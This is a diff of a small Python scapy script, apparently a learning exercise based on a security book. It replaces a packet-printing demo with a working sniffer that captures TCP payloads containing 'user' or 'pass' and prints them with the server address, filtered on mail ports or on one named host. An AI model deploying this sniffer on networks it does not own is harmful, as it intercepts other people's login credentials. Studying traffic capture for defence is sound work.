@@ -28,22 +28,46 @@
 
 print('韩大宝')
 
+
 from scapy.all import *
 
-def packet_callback(packet):
-    print(packet.show())
-
-sniff(prn=packet_callback, count=1)
-
-
-# def mailpacket_callback(packet):
-#     if packet['TCP'].payload:
-#         mail_packet = str(packet['TCP'].payload)
-#         if 'user' in mail_packet.lower() or 'pass' in mail_packet.lower():
-#             print('[*] Server: %s' % packet['IP'].dst)
-#             print('[*] %s' % packet['TCP'].payload)
+#  买的书上的demo
+# def packet_callback(packet):
+#     print(packet.show())
 #
-# sniff(filter='tcp port 110 or tcp port 24 or tcp port 143', prn=mailpacket_callback, store=0)
+# sniff(prn=packet_callback, count=1)
+
+
+def mailpacket_callback(packet):
+    if packet['TCP'].payload:
+        mail_packet = str(packet['TCP'].payload)
+        if 'user' in mail_packet.lower() or 'pass' in mail_packet.lower():
+            print('[*] Server: %s' % packet['IP'].dst)
+            print('[*] %s' % packet['TCP'].payload)
+
+# sniff(filter='tcp port 110 or tcp port 24 or tcp port 143', prn=mailpacket_callback, store=1)
+sniff(filter='tcp and host www.handabao.com', prn=mailpacket_callback, store=0)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
